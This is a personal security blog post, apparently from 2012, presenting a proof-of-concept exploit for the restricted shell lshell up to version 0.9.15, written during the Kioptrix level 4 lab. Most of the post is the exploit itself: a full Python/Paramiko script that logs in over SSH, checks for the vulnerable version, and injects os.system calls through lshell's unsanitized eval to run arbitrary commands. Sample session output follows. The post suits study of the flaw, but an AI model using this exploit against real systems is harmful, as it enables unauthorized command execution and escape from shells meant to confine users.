<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<style type=text/css>body{font-family:monospace;}</style>
	<title>lshell 0.9.15 pathing vulnerability</title>
	
	
	<link rel="stylesheet" href="/css/style.css">
	
	
</head>
<body>
	<header>

	<div style="float: right;"></div><br>
	<p>
	<nav>
			<a href="/"><b>post</b></a>.
			
			
			<a href="/other/"><b>other</b></a>.
			
			<a href="/about/"><b>about</b></a>.
			
	</nav>
	</p>
	
</header>

	
	<main>
		<article>
			<h1>lshell 0.9.15 pathing vulnerability</h1>
			<b><time>2012-12-30</time></b>
		       

			<div>
				<p>While working through Kioptrix level 4, I stumbled into <a href="https://github.com/ghantoos/lshell">lshell</a>, a limited shell environment developed in Python.  I don&rsquo;t want to walk through the vulnerability again, but at a high level versions &lt;= 0.9.15 are vulnerable to an unsanitized eval() call with user supplied input.  I couldn&rsquo;t find a working PoC, so I wrote one.</p>
<p>This will verify the install and spawn a pseudo-shell for running commands on the remote host.  While it may be more beneficial to just log in and run the exploit to spawn /bin/bash, this is a nice hacky way to quickly enumerate and tool around on the back end:</p>
<pre tabindex="0"><code>root@bt:~/kioptrix_l4# python lshell_remote.py john ****** 192.168.1.39
[!] .............................
[!] lshell &lt;= 0.9.15 remote shell.
[!] note: you can also ssh in and execute &#39;/bin/bash&#39;
[!] .............................
[!] Checking host 192.168.1.39...
[+] vulnerable lshell found, preparing pseudo-shell...
$ id
uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
$ ls -l
total 48
-rwxr-xr-x 1 john john  1544 2009-01-20 19:51 install.sh
-rw-r--r-- 1 john john  7715 2009-01-20 19:06 lib_mysqludf_sys.c
-rw-r--r-- 1 john john  9934 2009-01-21 19:42 lib_mysqludf_sys.html
-rwxr-xr-x 1 john john 12896 2009-01-19 04:11 lib_mysqludf_sys.so
-rw-r--r-- 1 john john  1647 2009-01-21 19:43 lib_mysqludf_sys.sql
-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
$ ls -l | grep &#39;Makefile&#39;
-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
$ exit
root@bt:~/kioptrix_l4#
</code></pre><p>You can run pretty much everything except for binary files; this is because of the shell environment changing. I wasn&rsquo;t able to figure out a clean way to attach a TTY to the stdin/stdout/stderr, so if anyone knows of a way to do this with Paramiko, drop me a message.  I&rsquo;ll take any bug reports as well.  This requires Paramiko libraries to be installed; tested with Python 2.7.x.</p>
<p><a href="http://pastebin.com/r7LCdeTC">Pastebin</a> link for download and code:</p>
<pre tabindex="0"><code>import paramiko
import traceback
from time import sleep

#
# Exploit lshell pathing vulnerability in &lt;= 0.9.15.
# Runs commands on the remote system.
# @dronesec
#

if len(sys.argv) &lt; 4:
    print &#39;%s: [USER] [PW] [IP] {opt: port}&#39;%(sys.argv[0])
    sys.exit(1)

try:
    print &#39;[!] .............................&#39;
    print &#39;[!] lshell &lt;= 0.9.15 remote shell.&#39;
    print &#39;[!] note: you can also ssh in and execute \&#39;/bin/bash\&#39;&#39;
    print &#39;[!] .............................&#39;
    print &#39;[!] Checking host %s...&#39;%(sys.argv[3])
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if len(sys.argv) == 5:
        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
    else:
        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])


    # verify lshell 
    channel = ssh.invoke_shell()
    while not channel.recv_ready(): sleep(1)
    ret = channel.recv(2048)

    channel.send(&#39;help help\n&#39;)
    while not channel.recv_ready(): sleep(1)
    ret = channel.recv(2048)

    if not &#39;lshell&#39; in ret:
        if &#39;forbidden&#39; in ret:
            print &#39;[-] Looks like we can\&#39;t execute SSH commands&#39;
        else:
            print &#39;[-] Environment is not lshell&#39;
        sys.exit(1)

    # verify vulnerable version
    channel.send(&#39;sudo\n&#39;)
    while not channel.recv_ready(): sleep(1)
    ret = channel.recv(2048)
    if not &#39;Traceback&#39; in ret:
        print &#39;[-] lshell version not vulnerable.&#39;
        sys.exit(1)
    channel.close()
    ssh.close()

    # exec shell
    print &#39;[+] vulnerable lshell found, preparing pseudo-shell...&#39;
    if len(sys.argv) == 5:
        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
    else:
        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])

    while True:
        cmd = raw_input(&#39;$ &#39;)

        # breaks paramiko
        if cmd[0] is &#39;/&#39;:
            print &#39;[!] Running binaries won\&#39;t work!&#39;
            continue

        cmd = cmd.replace(&#34;&#39;&#34;, r&#34;\&#39;&#34;)
        cmd = &#39;echo __import__(\&#39;os\&#39;).system(\&#39;%s\&#39;)&#39;%(cmd.replace(&#39; &#39;,r&#39;\t&#39;))
        if len(cmd) &gt; 1:
            if &#39;quit&#39; in cmd or &#39;exit&#39; in cmd:
                break
            (stdin,stdout,stderr) = ssh.exec_command(cmd)
        out = stdout.read()
        print out.strip()
except paramiko.AuthenticationException:
    print &#39;[-] Authentication to %s failed.&#39;%sys.argv[3]
except Exception, e:
    print &#39;[-] Error: &#39;, e
    print type(e)
    traceback.print_exc(file=sys.stdout)
finally:
    channel.close()
    ssh.close()
</code></pre>
			</div>
		</article>
	</main>
<aside>
	<div>
		<div>
			<h3>LATEST POSTS</h3>
		</div>
		<div>
			<ul>
				
				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
				
				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
				
				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
				
				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
				
				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
				
			</ul>
		</div>
	</div>
</aside>


	<footer>
	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
	</p>
</footer>

</body>
</html>
